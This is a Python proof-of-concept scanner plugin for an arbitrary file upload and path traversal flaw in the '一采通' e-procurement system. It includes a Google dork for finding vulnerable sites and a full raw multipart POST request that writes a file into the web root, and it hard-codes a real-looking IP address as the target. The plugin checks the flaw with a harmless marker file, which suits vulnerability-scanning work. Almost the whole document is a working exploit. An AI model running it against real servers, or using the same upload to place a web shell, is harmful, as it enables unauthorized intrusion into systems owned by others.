#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name: 一采通电子采购系统任意文件上传

#google dork：inurl:companycglist.aspx?ComId=*

#Refer: http://wooyun.org/bugs/wooyun-2010-0131973

def assign(service,arg):
    if service=="1caitong":
        return True,arg

def audit(arg):
    vun_url=arg+"Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=/../web/"
    raw='''POST /Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=%2f..%2fweb%2f HTTP/1.1
Host: 116.55.248.65:8001
Content-Length: 365
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://116.55.248.65:8001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySi7aFG5fhvI14Vbv
Referer: http://116.55.248.65:8001/Comm/UploadFile/webUpload.aspx?AttId=t.aspx&FilePath=/../web/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: ASP.NET_SessionId=mvmqjx11vk1sr3uaopcqkol3

------WebKitFormBoundarySi7aFG5fhvI14Vbv
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUJLTkxNTA4NDgxZGT4FQnTj63sW6bItFI88C2Fes3jcRPos/LRQn4yOHqiRw==
------WebKitFormBoundarySi7aFG5fhvI14Vbv
Content-Disposition: form-data; name="fa"; filename="123.cer"
Content-Type: application/x-x509-ca-cert

testvul
------WebKitFormBoundarySi7aFG5fhvI14Vbv--
'''
    code,head,res,errcode,finalurl=curl.curl2(vun_url,raw=raw)
    verify_url=arg+"test.cer"
    code,head,res,errcode,finalurl=curl.curl2(verify_url)
    if  code==200 and  "testvul" in res:
        security_hole('任意文件上传：'+vun_url)

if __name__=='__main__':
    from dummy import *
    audit(assign('1caitong','http://116.55.248.65:8001/')[1])